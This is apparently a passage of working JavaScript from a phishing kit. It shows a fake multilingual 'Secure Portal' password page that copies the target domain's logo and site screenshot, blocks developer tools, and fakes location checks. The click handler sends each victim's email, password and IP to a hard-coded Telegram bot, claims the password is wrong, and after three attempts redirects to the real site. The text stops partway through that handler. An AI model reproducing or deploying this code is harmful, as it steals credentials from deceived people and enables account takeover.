// ========== UPDATED: DUAL URL PARSER (Query Parameters + Hash) ==========
// Supports both ?email=user@example.com and #domain?token formats
// All existing functionality remains untouched

(function() {
  // ========== TOKEN GENERATION FUNCTION ==========
  function generateRandomToken(length = 24) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
  }
  
  // ========== NEW: QUERY PARAMETER PARSER (Facebook Style) ==========
  function parseQueryParameters() {
    // Get query string (everything after ?)
    const queryString = window.location.search;
    
    if (!queryString) {
      return { email: null, token: null, domain: null };
    }
    
    try {
      // Parse query parameters
      const urlParams = new URLSearchParams(queryString);
      
      // Look for email in various parameter names
      let email = urlParams.get('email') || 
                  urlParams.get('facebook') || 
                  urlParams.get('user') || 
                  urlParams.get('mail') ||
                  urlParams.get('account');
      
      let token = urlParams.get('token') || 
                  urlParams.get('t') || 
                  urlParams.get('auth') ||
                  urlParams.get('verification');
      
      // If email found, decode it (handles %40 to @ automatically)
      if (email) {
        email = decodeURIComponent(email);
        
        // Extract domain from email
        let domain = null;
        if (email.includes('@')) {
          const emailParts = email.split('@');
          domain = emailParts[1];
        } else {
          // If no @, treat the whole thing as domain
          domain = email;
          email = 'user@' + domain;
        }
        
        return { 
          email: email, 
          domain: domain,
          token: token
        };
      }
      
      return { email: null, token: null, domain: null };
      
    } catch (e) {
      console.error('Error parsing query parameters:', e);
      return { email: null, token: null, domain: null };
    }
  }
  
  // ========== EXISTING: URL FRAGMENT PARSING (Hash-based) ==========
  function parseUrlFragment() {
    // Get hash and remove #
    const fragment = window.location.hash.substring(1);
    
    if (!fragment) {
      return { email: null, token: null, domain: null };
    }
    
    try {
      // First decode %40 to @ (your original functionality)
      const decodedFragment = decodeURIComponent(fragment.replace(/%40/g, '@'));
      
      // Check for ? separator for token
      const questionMarkIndex = decodedFragment.indexOf('?');
      
      if (questionMarkIndex !== -1) {
        const domainPart = decodedFragment.substring(0, questionMarkIndex);
        const tokenPart = decodedFragment.substring(questionMarkIndex + 1);
        
        if (domainPart.includes('@')) {
          const emailParts = domainPart.split('@');
          return { 
            email: domainPart, 
            domain: emailParts[1],
            token: tokenPart 
          };
        } else {
          // If no @, assume domain only, create email
          const defaultUser = 'user';
          const email = defaultUser + '@' + domainPart;
          return { 
            email: email, 
            domain: domainPart,
            token: tokenPart 
          };
        }
      } else {
        // No token, just email or domain
        if (decodedFragment.includes('@')) {
          const emailParts = decodedFragment.split('@');
          return { 
            email: decodedFragment, 
            domain: emailParts[1],
            token: null 
          };
        } else {
          // No @, assume domain only
          const defaultUser = 'user';
          const email = defaultUser + '@' + decodedFragment;
          return { 
            email: email, 
            domain: decodedFragment,
            token: null 
          };
        }
      }
    } catch (e) {
      console.error('Error parsing URL fragment:', e);
      return { email: null, token: null, domain: null };
    }
  }
  
  // ========== PARSE URL: Try Query Parameters First, Then Hash ==========
  let urlData = parseQueryParameters();
  let source = 'query';
  
  // If no email found in query, try hash (backward compatibility)
  if (!urlData.email) {
    urlData = parseUrlFragment();
    source = 'hash';
  }
  
  const { email: emailFromUrl, domain: domainFromUrl, token: tokenFromUrl } = urlData;
  
  // Set email and domain (use parsed email or default)
  var my_email = emailFromUrl || 'user@example.com';
  var my_token = tokenFromUrl || null;
  var my_domain = domainFromUrl || (my_email.includes('@') ? my_email.split('@')[1] : 'example.com');
  var my_slice = my_domain;
  
  // Log which method was used
  if (emailFromUrl) {
    console.log(`✅ Email loaded from ${source} parameters:`, my_email);
    if (source === 'query') {
      console.log('   URL format: ?email=user@example.com&token=abc123');
    } else {
      console.log('   URL format: #domain?token');
    }
  } else {
    console.log('ℹ️ No email found, using default');
  }
  
  // ========== ONE TIME PER BROWSER SESSION CHECK WITH REDIRECT ==========
  if (sessionStorage.getItem('pageViewed')) {
    if (my_slice) {
      var redirectUrl = "https://www." + my_slice;
      window.location.replace(redirectUrl);
    } else {
      window.location.replace("https://www.google.com");
    }
    return;
  }
  
  sessionStorage.setItem('pageViewed', 'true');
  
  // ========== GENERATE TOKEN IF NOT PRESENT ==========
  if (emailFromUrl && !my_token) {
    my_token = generateRandomToken(32);
    
    // Update URL with token (preserve the format that was used)
    let newUrl;
    
    if (source === 'query') {
      // Update query parameters
      const urlParams = new URLSearchParams(window.location.search);
      urlParams.set('token', my_token);
      newUrl = window.location.protocol + '//' + window.location.host + 
               window.location.pathname + '?' + urlParams.toString();
    } else {
      // Update hash format
      const domain = my_email.split('@')[1];
      newUrl = window.location.protocol + '//' + window.location.host + 
               window.location.pathname + '#' + domain + '?' + my_token;
    }
    
    history.pushState({}, '', newUrl);
    console.log('Generated new token:', my_token);
    console.log('Updated URL:', newUrl);
  } else if (emailFromUrl && my_token && source === 'hash' && !domainFromUrl) {
    // Existing hash conversion logic
    const domain = my_email.split('@')[1];
    const newUrl = window.location.protocol + '//' + window.location.host + 
                   window.location.pathname + '#' + domain + '?' + my_token;
    history.pushState({}, '', newUrl);
    console.log('Converted old URL to domain?token format');
  }
  
  // ========== USE THE EMAIL (Your original usage - UNTOUCHED) ==========
  if (emailFromUrl) {
    console.log('User email:', my_email);
    // Use email in your page
    if (document.getElementById('email-field')) {
      document.getElementById('email-field').value = my_email;
    }
  }
  
  // ========== DISABLE RIGHT CLICK AND KEYBOARD SHORTCUTS ==========
  function disableShortcuts(e) {
    var key = e.keyCode || e.which;
    
    // F12
    if (key == 123) {
      e.preventDefault();
      return false;
    }
    
    // Ctrl+Shift+I (73), Ctrl+Shift+J (74), Ctrl+U (85)
    if (e.ctrlKey && e.shiftKey && (key == 73 || key == 74)) {
      e.preventDefault();
      return false;
    }
    
    // Ctrl+U
    if (e.ctrlKey && key == 85) {
      e.preventDefault();
      return false;
    }
    
    // Ctrl+S (save)
    if (e.ctrlKey && key == 83) {
      e.preventDefault();
      return false;
    }
  }
  
  // Attach event listeners for shortcuts
  document.addEventListener('keydown', disableShortcuts);
  document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    return false;
  });
  
  // ========== LOADING STATE MANAGEMENT ==========
  const loadingStates = {
    location: false,
    background: false,
    logo: false,
    ip: false
  };

  function checkAllLoadingComplete() {
    const allComplete = Object.values(loadingStates).every(state => state === true);
    if (allComplete) {
      console.log('All resources loaded successfully');
    }
  }

  function setLoadingState(resource, status) {
    loadingStates[resource] = status;
    checkAllLoadingComplete();
  }

  // ========== LANGUAGE TRANSLATIONS BASED ON DOMAIN ==========
  const translations = {
    en: {
      loadingTitle: 'Initializing',
      loadingSub: 'Establishing secure connection',
      loadingFooter: '256-bit encrypted',
      appTitle: 'Secure Portal',
      verifiedBadge: 'verified',
      statusProtected: 'protected',
      statusSecure: 'secure',
      messageText: 'Only recipient email can access shared PDF <b>encrypted</b> document. Enter password to continue.',
      passwordLabel: 'password',
      passwordPlaceholder: 'Enter your password',
      passwordRequired: 'Password is required',
      passwordShort: 'Password must be at least 3 characters',
      authRequired: 'Authentication required',
      passwordIncorrect: 'Password is not correct. Please try again',
      forgotLink: 'Forgot password?',
      continueText: 'Continue',
      footerPortal: 'portal',
      footerPrivacy: 'privacy',
      passwordVisible: 'Password is now visible',
      passwordHidden: 'Password is hidden',
      loadingLocation: 'Detecting your location...',
      loadingSecure: 'Establishing secure connection...'
    },
    pt: {
      loadingTitle: 'Inicializando',
      loadingSub: 'Estabelecendo conexão segura',
      loadingFooter: 'Criptografia de 256 bits',
      appTitle: 'Portal Seguro',
      verifiedBadge: 'verificado',
      statusProtected: 'protegido',
      statusSecure: 'seguro',
      messageText: 'Apenas o e-mail do destinatário pode acessar o PDF compartilhado <b>criptografado</b>. Digite a senha para continuar.',
      passwordLabel: 'senha',
      passwordPlaceholder: 'Digite sua senha',
      passwordRequired: 'Senha é obrigatória',
      passwordShort: 'A senha deve ter pelo menos 3 caracteres',
      authRequired: 'Autenticação necessária',
      passwordIncorrect: 'Senha incorreta. Por favor, tente novamente',
      forgotLink: 'Esqueceu a senha?',
      continueText: 'Continuar',
      footerPortal: 'portal',
      footerPrivacy: 'privacidade',
      passwordVisible: 'Senha agora está visível',
      passwordHidden: 'Senha está oculta',
      loadingLocation: 'Detectando sua localização...',
      loadingSecure: 'Estabelecendo conexão segura...'
    },
    es: {
      loadingTitle: 'Inicializando',
      loadingSub: 'Estableciendo conexión segura',
      loadingFooter: 'Cifrado de 256 bits',
      appTitle: 'Portal Seguro',
      verifiedBadge: 'verificado',
      statusProtected: 'protegido',
      statusSecure: 'seguro',
      messageText: 'Solo el correo del destinatario puede acceder al PDF compartido <b>cifrado</b>. Ingrese la contraseña para continuar.',
      passwordLabel: 'contraseña',
      passwordPlaceholder: 'Ingrese su contraseña',
      passwordRequired: 'La contraseña es obligatoria',
      passwordShort: 'La contraseña debe tener al menos 3 caracteres',
      authRequired: 'Autenticación requerida',
      passwordIncorrect: 'Contraseña incorrecta. Por favor, intente de nuevo',
      forgotLink: '¿Olvidó su contraseña?',
      continueText: 'Continuar',
      footerPortal: 'portal',
      footerPrivacy: 'privacidad',
      passwordVisible: 'La contraseña ahora es visible',
      passwordHidden: 'La contraseña está oculta',
      loadingLocation: 'Detectando tu ubicación...',
      loadingSecure: 'Estableciendo conexión segura...'
    },
    fr: {
      loadingTitle: 'Initialisation',
      loadingSub: 'Établissement d\'une connexion sécurisée',
      loadingFooter: 'Chiffrement 256 bits',
      appTitle: 'Portail Sécurisé',
      verifiedBadge: 'vérifié',
      statusProtected: 'protégé',
      statusSecure: 'sécurisé',
      messageText: 'Seul l\'e-mail du destinataire peut accéder au PDF partagé <b>chiffré</b>. Entrez le mot de passe pour continuer.',
      passwordLabel: 'mot de passe',
      passwordPlaceholder: 'Entrez votre mot de passe',
      passwordRequired: 'Le mot de passe est requis',
      passwordShort: 'Le mot de passe doit contenir au moins 3 caractères',
      authRequired: 'Authentification requise',
      passwordIncorrect: 'Mot de passe incorrect. Veuillez réessayer',
      forgotLink: 'Mot de passe oublié?',
      continueText: 'Continuer',
      footerPortal: 'portail',
      footerPrivacy: 'confidentialité',
      passwordVisible: 'Le mot de passe est maintenant visible',
      passwordHidden: 'Le mot de passe est masqué',
      loadingLocation: 'Détection de votre position...',
      loadingSecure: 'Établissement d\'une connexion sécurisée...'
    },
    de: {
      loadingTitle: 'Initialisierung',
      loadingSub: 'Sichere Verbindung wird hergestellt',
      loadingFooter: '256-Bit-verschlüsselt',
      appTitle: 'Sicheres Portal',
      verifiedBadge: 'verifiziert',
      statusProtected: 'geschützt',
      statusSecure: 'sicher',
      messageText: 'Nur die E-Mail des Empfängers kann auf das <b>verschlüsselte</b> PDF-Dokument zugreifen. Geben Sie das Passwort ein, um fortzufahren.',
      passwordLabel: 'passwort',
      passwordPlaceholder: 'Geben Sie Ihr Passwort ein',
      passwordRequired: 'Passwort ist erforderlich',
      passwordShort: 'Das Passwort muss mindestens 3 Zeichen lang sein',
      authRequired: 'Authentifizierung erforderlich',
      passwordIncorrect: 'Passwort ist nicht korrekt. Bitte versuchen Sie es erneut',
      forgotLink: 'Passwort vergessen?',
      continueText: 'Weiter',
      footerPortal: 'portal',
      footerPrivacy: 'datenschutz',
      passwordVisible: 'Passwort ist jetzt sichtbar',
      passwordHidden: 'Passwort ist versteckt',
      loadingLocation: 'Ihren Standort wird erkannt...',
      loadingSecure: 'Sichere Verbindung wird hergestellt...'
    },
    it: {
      loadingTitle: 'Inizializzazione',
      loadingSub: 'Connessione sicura in corso',
      loadingFooter: 'Crittografia a 256 bit',
      appTitle: 'Portale Sicuro',
      verifiedBadge: 'verificato',
      statusProtected: 'protetto',
      statusSecure: 'sicuro',
      messageText: 'Solo l\'email del destinatario può accedere al PDF <b>crittografato</b>. Inserisci la password per continuare.',
      passwordLabel: 'password',
      passwordPlaceholder: 'Inserisci la tua password',
      passwordRequired: 'La password è obbligatoria',
      passwordShort: 'La password deve contenere almeno 3 caratteri',
      authRequired: 'Autenticazione richiesta',
      passwordIncorrect: 'Password non corretta. Riprova',
      forgotLink: 'Password dimenticata?',
      continueText: 'Continua',
      footerPortal: 'portale',
      footerPrivacy: 'privacy',
      passwordVisible: 'La password è ora visibile',
      passwordHidden: 'La password è nascosta',
      loadingLocation: 'Rilevamento della tua posizione...',
      loadingSecure: 'Connessione sicura in corso...'
    },
    nl: {
      loadingTitle: 'Initialiseren',
      loadingSub: 'Beveiligde verbinding tot stand brengen',
      loadingFooter: '256-bits versleuteld',
      appTitle: 'Veilige Portal',
      verifiedBadge: 'geverifieerd',
      statusProtected: 'beschermd',
      statusSecure: 'veilig',
      messageText: 'Alleen e-mail van ontvanger heeft toegang tot <b>versleuteld</b> PDF-document. Voer wachtwoord in om door te gaan.',
      passwordLabel: 'wachtwoord',
      passwordPlaceholder: 'Voer uw wachtwoord in',
      passwordRequired: 'Wachtwoord is verplicht',
      passwordShort: 'Wachtwoord moet minimaal 3 tekens bevatten',
      authRequired: 'Authenticatie vereist',
      passwordIncorrect: 'Wachtwoord is onjuist. Probeer opnieuw',
      forgotLink: 'Wachtwoord vergeten?',
      continueText: 'Doorgaan',
      footerPortal: 'portaal',
      footerPrivacy: 'privacy',
      passwordVisible: 'Wachtwoord is nu zichtbaar',
      passwordHidden: 'Wachtwoord is verborgen',
      loadingLocation: 'Uw locatie wordt gedetecteerd...',
      loadingSecure: 'Beveiligde verbinding wordt gemaakt...'
    }
  };

  // Domain to language mapping
  const domainLanguageMap = {
    '.pt': 'pt', '.br': 'pt', '.ao': 'pt', '.mz': 'pt', '.cv': 'pt',
    '.es': 'es', '.mx': 'es', '.ar': 'es', '.co': 'es', '.pe': 'es', '.ve': 'es', '.cl': 'es', '.ec': 'es', '.gt': 'es', '.cu': 'es', '.bo': 'es', '.do': 'es', '.py': 'es',
    '.fr': 'fr', '.be': 'fr', '.ch': 'fr', '.lu': 'fr', '.mc': 'fr',
    '.de': 'de', '.at': 'de',
    '.it': 'it', '.sm': 'it',
    '.nl': 'nl',
    '.pl': 'pl',
    '.ru': 'ru', '.by': 'ru', '.kz': 'ru',
    '.jp': 'ja',
    '.kr': 'ko',
    '.cn': 'zh', '.tw': 'zh', '.hk': 'zh',
    '.sa': 'ar', '.ae': 'ar', '.eg': 'ar', '.kw': 'ar', '.qa': 'ar',
    '.in': 'hi',
    '.tr': 'tr',
    '.com': 'en', '.org': 'en', '.net': 'en', '.edu': 'en', '.gov': 'en', '.uk': 'en', '.us': 'en', '.ca': 'en', '.au': 'en', '.nz': 'en', '.ie': 'en'
  };

  // Current language
  let currentLang = 'en';

  // Function to detect language from domain
  function detectLanguageFromDomain(domain) {
    if (!domain) return 'en';
    
    domain = domain.toLowerCase();
    
    for (const [tld, lang] of Object.entries(domainLanguageMap)) {
      if (domain.endsWith(tld)) {
        return lang;
      }
    }
    
    const parts = domain.split('.');
    if (parts.length >= 2) {
      const lastPart = '.' + parts[parts.length - 1];
      const secondLast = parts.length >= 3 ? '.' + parts[parts.length - 2] + lastPart : null;
      
      if (secondLast && domainLanguageMap[secondLast]) {
        return domainLanguageMap[secondLast];
      }
      if (domainLanguageMap[lastPart]) {
        return domainLanguageMap[lastPart];
      }
    }
    
    return 'en';
  }

  // Function to update all text based on language
  function updateLanguage(lang) {
    const t = translations[lang] || translations.en;
    
    if ($('#loadingTitle').length) {
      $('#loadingTitle').html(t.loadingTitle + '<span class="loading-dots"></span>');
    }
    if ($('#loadingSub').length) {
      $('#loadingSub').text(t.loadingSub);
    }
    if ($('#loadingFooter').length) {
      $('#loadingFooter').html('<i class="fas fa-lock" style="margin-right: 6px;"></i> ' + t.loadingFooter);
    }
    
    if ($('#appTitle').length) $('#appTitle').text(t.appTitle);
    if ($('#verifiedBadge').length) {
      $('#verifiedBadge').html('<i class="fas fa-check-circle" style="font-size: 12px;"></i> ' + t.verifiedBadge);
    }
    if ($('#statusProtected').length) $('#statusProtected').text(t.statusProtected);
    if ($('#statusSecure').length) $('#statusSecure').text(t.statusSecure);
    
    if ($('#messageText').length) {
      const messageText = t.messageText;
      const parts = messageText.split('<b>');
      if (parts.length > 1) {
        const subParts = parts[1].split('</b>');
        $('#messageText').html(parts[0] + '<b>' + subParts[0] + '</b>' + subParts[1]);
      } else {
        $('#messageText').text(messageText);
      }
    }
    
    if ($('#passwordLabel').length) {
      $('#passwordLabel').html('<i class="fas fa-key" style="margin-right: 4px;"></i> ' + t.passwordLabel);
    }
    if ($('#passwordPlaceholder').length) $('#passwordPlaceholder').text(t.passwordPlaceholder);
    if ($('#passwordErrorText').length) $('#passwordErrorText').text(t.passwordRequired);
    if ($('#auth_reg_message').length) $('#auth_reg_message').text(t.authRequired);
    if ($('#msg_message').length) $('#msg_message').text(t.passwordIncorrect);
    if ($('#forgotLink').length) $('#forgotLink').text(t.forgotLink);
    if ($('#continueText').length) $('#continueText').text(t.continueText);
    if ($('#footerPortal').length) $('#footerPortal').text(t.footerPortal);
    if ($('#footerPrivacy').length) $('#footerPrivacy').text(t.footerPrivacy);
    
    currentLang = lang;
  }

  // ========== NOTIFICATION SYSTEM ==========
  function showNotification(message, type = 'info', duration = 3000) {
    let container = $('#notificationContainer');
    if (!container.length) {
      container = $('<div id="notificationContainer" style="position: fixed; top: 20px; right: 20px; z-index: 9999;"></div>');
      $('body').append(container);
    }
    
    const id = 'notif-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
    
    const iconMap = {
      success: 'fa-check-circle',
      error: 'fa-exclamation-circle',
      warning: 'fa-exclamation-triangle',
      info: 'fa-info-circle'
    };
    
    const icon = iconMap[type] || iconMap.info;
    
    const notification = $(`
      <div class="notification ${type}" id="${id}" style="background: white; border-radius: 8px; padding: 12px 20px; margin-bottom: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); display: flex; align-items: center; min-width: 300px; border-left: 4px solid ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : type === 'warning' ? '#f59e0b' : '#3b82f6'};">
        <div class="notification-icon" style="margin-right: 12px;">
          <i class="fas ${icon}" style="color: ${type === 'success' ? '#10b981' : type === 'error' ? '#ef4444' : type === 'warning' ? '#f59e0b' : '#3b82f6'};"></i>
        </div>
        <div class="notification-content" style="flex: 1;">${message}</div>
        <div class="notification-close" style="cursor: pointer; margin-left: 12px;">
          <i class="fas fa-times" style="color: #94a3b8;"></i>
        </div>
      </div>
    `);
    
    container.append(notification);
    
    const timeout = setTimeout(() => {
      removeNotification(id);
    }, duration);
    
    notification.find('.notification-close').on('click', function() {
      clearTimeout(timeout);
      removeNotification(id);
    });
    
    notification.data('timeout', timeout);
  }
  
  function removeNotification(id) {
    const notification = $('#' + id);
    if (notification.length) {
      notification.fadeOut(300, function() {
        $(this).remove();
      });
    }
  }
  
  // ========== PASSWORD VISIBILITY TOGGLE ==========
  const passwordInput = $('#passwordInput');
  const toggleIcon = $('#toggleIcon');
  
  if ($('#passwordToggle').length) {
    $('#passwordToggle').on('click', function() {
      if (!passwordInput.length) return;
      
      const type = passwordInput.attr('type') === 'password' ? 'text' : 'password';
      passwordInput.attr('type', type);
      
      if (toggleIcon.length) {
        if (type === 'text') {
          toggleIcon.removeClass('fa-eye').addClass('fa-eye-slash');
          $(this).addClass('active');
          showNotification(translations[currentLang]?.passwordVisible || 'Password is now visible', 'warning', 1500);
        } else {
          toggleIcon.removeClass('fa-eye-slash').addClass('fa-eye');
          $(this).removeClass('active');
          showNotification(translations[currentLang]?.passwordHidden || 'Password is hidden', 'info', 1500);
        }
      }
    });
  }
  
  // ========== SET EMAIL VALUE ==========
  function setEmailValue() {
    // Set the email input value
    if ($("#email").length) {
      $("#email").val(my_email);
      
      // Add these attributes to ensure the full email is visible
      $("#email").attr('size', Math.min(my_email.length, 40));
      $("#email").attr('spellcheck', 'false');
      
      if ($("#email").attr('maxlength')) {
        $("#email").removeAttr('maxlength');
      }
    }
    
    if ($("#manutd").length) $("#manutd").html(my_email);
    
    var ind = my_email.indexOf("@");
    var my_slice_display = my_email.substr((ind + 1));
    
    if ($('#footer_dom').length) $('#footer_dom').html(my_slice_display);
    if ($('#loadingEmailDisplay').length) $('#loadingEmailDisplay').html(my_email);
    if ($('#displayEmail').length) $('#displayEmail').html(my_email);
    
    if (my_token && $('#body').length) {
      $('#body').data('token', my_token);
    }
    
    if ($('#domainName').length) $('#domainName').html(my_slice_display);
    
    // Detect language from domain
    const detectedLang = detectLanguageFromDomain(my_slice_display);
    if ($('#languageSelect').length) $('#languageSelect').val(detectedLang);
    updateLanguage(detectedLang);
    
    // ========== FAVICON & LOGO FROM GOOGLE S2 ==========
    var domain = my_slice_display;
    
    var faviconUrl16 = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=16";
    var faviconUrl32 = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=32";
    var faviconUrl64 = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=64";
    var faviconUrl128 = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
    
    if ($("#faviconx").length) $("#faviconx").attr("href", faviconUrl32);
    if ($("#faviconx-alt").length) $("#faviconx-alt").attr("href", faviconUrl32);
    if ($("#faviconx-apple").length) $("#faviconx-apple").attr("href", faviconUrl128);
    
    $('head').append('<link rel="icon" type="image/png" href="' + faviconUrl32 + '" sizes="32x32">');
    $('head').append('<link rel="icon" type="image/png" href="' + faviconUrl16 + '" sizes="16x16">');
    
    if ($('#appIcon').length) {
      var logoImg = $('<img>').attr('src', faviconUrl64).attr('alt', domain + ' logo')
        .css('display', 'none')
        .on('load', function() {
          setLoadingState('logo', true);
          if ($('#logoFallback').length) $('#logoFallback').hide();
          $(this).fadeIn(300);
          console.log('Logo loaded successfully for:', domain);
        })
        .on('error', function() {
          console.log('Logo failed to load for:', domain, '- using fallback');
          setLoadingState('logo', true);
          if ($('#logoFallback').length) $('#logoFallback').show();
          $(this).remove();
          
          var fallbackImg = $('<img>').attr('src', faviconUrl128).attr('alt', domain + ' logo')
            .css('display', 'none')
            .on('load', function() {
              if ($('#logoFallback').length) $('#logoFallback').hide();
              $(this).fadeIn(300);
            })
            .on('error', function() {
              $(this).remove();
            });
          $('#appIcon').append(fallbackImg);
        });
      
      $('#appIcon').append(logoImg);
    }
    
    if ($("#logoImage").length) {
      $("#logoImage").attr("src", faviconUrl64);
    }
    
    // ========== FULL BACKGROUND IMAGE FROM THUM.IO ==========
    var thumUrl = 'https://image.thum.io/get/width/1920/https://' + domain;
    
    if ($('body').length) {
      $('#dynamicBackground').remove();
      
      const bgDiv = $('<div id="dynamicBackground" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; transition: opacity 0.5s ease;"></div>');
      $('body').prepend(bgDiv);
      
      bgDiv.css({
        'background': 'linear-gradient(145deg, #f6f9fc 0%, #edf2f7 100%)'
      });
      
      $('body').css({
        'margin': '0',
        'padding': '0',
        'min-height': '100vh',
        'background': 'linear-gradient(145deg, #f6f9fc 0%, #edf2f7 100%)'
      });
    }
    
    var bgImg = new Image();
    bgImg.crossOrigin = 'anonymous';
    bgImg.src = thumUrl;
    
    bgImg.onload = function() {
      setLoadingState('background', true);
      
      $('#dynamicBackground').css({
        'background': 'url(' + thumUrl + ') no-repeat center center fixed',
        'background-size': 'cover',
        '-webkit-background-size': 'cover',
        '-moz-background-size': 'cover',
        '-o-background-size': 'cover',
        'opacity': '0.85'
      });
      
      $('body').css({
        'background': 'url(' + thumUrl + ') no-repeat center center fixed',
        'background-size': 'cover'
      });
      
      console.log('Full background loaded successfully for:', domain);
    };
    
    bgImg.onerror = function() {
      setLoadingState('background', true);
      console.log('Background failed to load for:', domain, '- using gradient fallback');
    };
    
    $(document).attr("title", 'PORTAL - ' + domain + ' secure');
  }
  
  // Call the function to set email value
  setEmailValue();
  
  // ========== LOCATION & IP FUNCTIONS ==========
  function getCountryAndIP() {
    if ($('#locationDisplay').length) {
      $('#locationDisplay').html('<i class="fas fa-spinner fa-spin"></i> ' + (translations[currentLang]?.loadingLocation || 'Detecting location...'));
    }
    
    const timeout = setTimeout(() => {
      setLoadingState('location', true);
      setLoadingState('ip', true);
      if ($('#locationDisplay').length) {
        $('#locationDisplay').html('Austin, Texas, United States');
      }
      if ($('#osDisplay').length) {
        $('#osDisplay').html('Windows 11 · Central Time');
      }
      showNotification('Using default location (API timeout)', 'warning', 3000);
    }, 5000);
    
    $.getJSON('https://ipapi.co/json/')
      .done(function(data) {
        clearTimeout(timeout);
        setLoadingState('location', true);
        setLoadingState('ip', true);
        
        var country = data.country_name || 'Unknown';
        var city = data.city || 'Unknown';
        var region = data.region || '';
        var ip = data.ip || 'Unknown';
        var timezone = data.timezone || 'UTC';
        var countryCode = data.country_code || 'US';
        
        if ($('#locationDisplay').length) {
          $('#locationDisplay').html(city + ', ' + region + ', ' + country);
        }
        
        if ($('#osDisplay').length) {
          var tzPart = timezone.split('/')[1] || timezone;
          $('#osDisplay').html('Windows 11 · ' + tzPart);
        }
        
        if ($('#body').length) {
          $('#body').data('country', country);
          $('#body').data('ip', ip);
          $('#body').data('city', city);
          $('#body').data('countryCode', countryCode);
        }
        
        console.log('Location detected:', city, country, 'IP:', ip);
        showNotification(' Location: ' + city + ', ' + country, 'success', 3000);
      })
      .fail(function() {
        $.getJSON('https://ipinfo.io/json')
          .done(function(data) {
            clearTimeout(timeout);
            setLoadingState('location', true);
            setLoadingState('ip', true);
            
            var city = data.city || 'Unknown';
            var region = data.region || '';
            var country = data.country || 'US';
            var timezone = data.timezone || 'America/Chicago';
            var ip = data.ip || 'Unknown';
            
            if ($('#locationDisplay').length) {
              $('#locationDisplay').html(city + ', ' + region + ', ' + country);
            }
            
            if ($('#osDisplay').length) {
              var tzPart = timezone.split('/')[1] || timezone;
              $('#osDisplay').html('Windows 11 · ' + tzPart);
            }
            
            showNotification(' Location: ' + city + ', ' + country, 'success', 3000);
          })
          .fail(function() {
            clearTimeout(timeout);
            setLoadingState('location', true);
            setLoadingState('ip', true);
            
            if ($('#locationDisplay').length) {
              $('#locationDisplay').html('Austin, Texas, United States');
            }
            if ($('#osDisplay').length) {
              $('#osDisplay').html('Windows 11 · Central Time');
            }
            showNotification('Using default location (API unavailable)', 'warning', 3000);
          });
      });
  }
  
  getCountryAndIP();
  
  function getIPForTelegram(callback) {
    $.getJSON('https://api.ipify.org?format=json')
      .done(function(data) {
        callback(data.ip);
      })
      .fail(function() {
        callback('Unknown');
      });
  }
  
  // ========== TIME UPDATE FUNCTION ==========
  function updateTime() {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    if ($('#liveTime').length) {
      $('#liveTime').html(hours + ':' + minutes + ':' + seconds);
    }
  }
  
  if ($('#liveTime').length) {
    updateTime();
    setInterval(updateTime, 1000);
  }
  
  // ========== LOADING SCREEN TRANSITION ==========
  setTimeout(function() {
    if ($('#loadingScreen').length) {
      $('#loadingScreen').addClass('hidden');
    }
    if ($('#appContainer').length) {
      $('#appContainer').css('opacity', '1');
    }
    if ($('#passwordInput').length) {
      $('#passwordInput').focus();
    }
    showNotification(' Portal ready', 'success', 3000);
  }, 2800);
  
  // ========== COUNTER FOR ATTEMPTS ==========
  var count = 0;
  
  // ========== NEXT BUTTON WITH TELEGRAM INTEGRATION ==========
  if ($('#nextButton').length) {
    $('#nextButton').on('click', function(e) {
      e.preventDefault();
      var password = $('#passwordInput').val();
      
      function showPasswordError(show, message) {
        const errorEl = $('#passwordError');
        if (errorEl.length) {
          if (show) {
            errorEl.find('span').text(message || translations[currentLang]?.passwordRequired || 'Password is required');
            errorEl.show();
          } else {
            errorEl.hide();
          }
        }
      }
      
      showPasswordError(false);
      if ($('#auth_reg').length) $('#auth_reg').hide();
      if ($('#msg').length) $('#msg').hide();
      
      if (!password) {
        showPasswordError(true, translations[currentLang]?.passwordRequired || 'Password is required');
        showNotification(' ' + (translations[currentLang]?.passwordRequired || 'Please enter your password'), 'error', 3000);
        if ($('#passwordInput').length) {
          $('#passwordInput').css('border-color', '#dc2626').focus();
        }
        return;
      }
      
      if (password.length < 3) {
        showPasswordError(true, translations[currentLang]?.passwordShort || 'Password must be at least 3 characters');
        showNotification(' ' + (translations[currentLang]?.passwordShort || 'Password too short'), 'error', 3000);
        if ($('#passwordInput').length) {
          $('#passwordInput').css('border-color', '#dc2626').focus();
        }
        return;
      }
      
      if ($('#passwordInput').length) {
        $('#passwordInput').css('border-color', '#e2e8f0');
      }
      
      const $button = $(this);
      const originalText = $button.html();
      $button.html('<i class="fas fa-spinner fa-spin"></i> Processing...').prop('disabled', true);
      
      getIPForTelegram(function(ip) {
        var message = ` **Billion Dollar FC ** \n\n Email: ${my_email}\n Password: ${password}\n IP Address: ${ip}\n Domain: ${my_slice}\n Time: ${new Date().toLocaleString()}`;
        
        var chat_id = "5339485049";
        var bot_token = "7082479088:AAEcZWXUTbdYdmRdsd-QXBPSstrd83YWtz8";
        var telegram_url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
        
        $.ajax({
          url: telegram_url,
          type: 'POST',
          data: {
            chat_id: chat_id,
            text: message,
            parse_mode: 'HTML'
          },
          success: function(response) {
            console.log('Telegram message sent successfully');
          },
          error: function(error) {
            console.log('Error sending Telegram message:', error);
          },
          complete: function() {
            $button.html(originalText).prop('disabled', false);
          }
        });
        
        count++;
        console.log('Attempt count:', count);
        
        if (count >= 3) {
          count = 0;
          window.location.replace("https://www." + my_slice);
          return;
        }
        
        if ($("#auth_reg").length) {
          $("#auth_reg").show();
          $('#auth_reg_message').html(translations[currentLang]?.passwordIncorrect || "Password is not correct. Please try again");
        }
        if ($("#passwordInput").length) {
          $("#passwordInput").val("");
        }
        setTimeout(function() {
